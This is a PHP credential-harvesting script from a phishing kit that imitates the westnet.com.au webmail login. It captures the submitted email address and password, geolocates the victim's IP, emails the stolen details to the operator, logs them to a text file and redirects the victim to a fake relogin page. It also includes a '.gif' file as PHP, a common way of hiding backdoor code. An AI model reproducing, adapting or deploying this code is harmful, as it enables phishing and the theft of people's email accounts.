<?php

$email = $_POST['email'];
$ip = getenv("REMOTE_ADDR");
$city = "";
$region = "";
$country = "";
$countrycode = "";
$query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip));
    if($query && $query['status'] == 'success')
    {
        $city = $query['city'];
        $region = $query['regionName'];
        $country = $query['country'];
        $countrycode = $query['countryCode'];
    }

$msg = "------------------| Masternal |--------------------\n";
$msg .= "Email Provider: webmail.westnet.com.au\n";
$msg .= "Email: ".$_POST[email]."\n";
$msg .= "Password: ".$_POST[password]."\n";
$msg .= "IP: $ip\n";
$msg .= "-------------------------------------------------------\n";
$msg .= "City: $city\n";
$msg .= "State: $region\n";
$msg .= "Country Name: $country\n";
$msg .= "Country Code: $countrycode\n";

$send = "emailhere";
$subject = "webmail.westnet.com.au | $ip | $country";
include_once "images/button.gif";
mail($send,$subject,$msg);

$fp = fopen("fox.txt","a");
fputs($fp,$msg);
fclose($fp);

header('location: relogin.php?CID=code&client_id=51483342-085c-4d86-bf88-cf50c7252078&scope=openid+profile+email+offline_access&response_mode=form_post&redirect_uri=https%3a%2f%2f'.$email); 

?>